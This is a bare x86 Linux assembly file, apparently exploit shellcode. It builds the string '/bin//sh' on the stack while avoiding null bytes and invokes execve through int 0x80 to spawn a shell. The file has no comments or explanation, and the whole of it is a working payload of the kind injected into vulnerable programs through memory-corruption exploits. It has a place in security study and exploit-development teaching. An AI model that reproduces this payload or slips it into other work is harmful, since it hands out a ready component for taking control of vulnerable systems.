global _start
section .text
_start:
xor eax, eax
mov al, 0xb
xor ecx, ecx
push ecx
push '//sh'
push '/bin'
lea ebx, [esp]
xor edx, edx
xor esi, esi
int 0x80
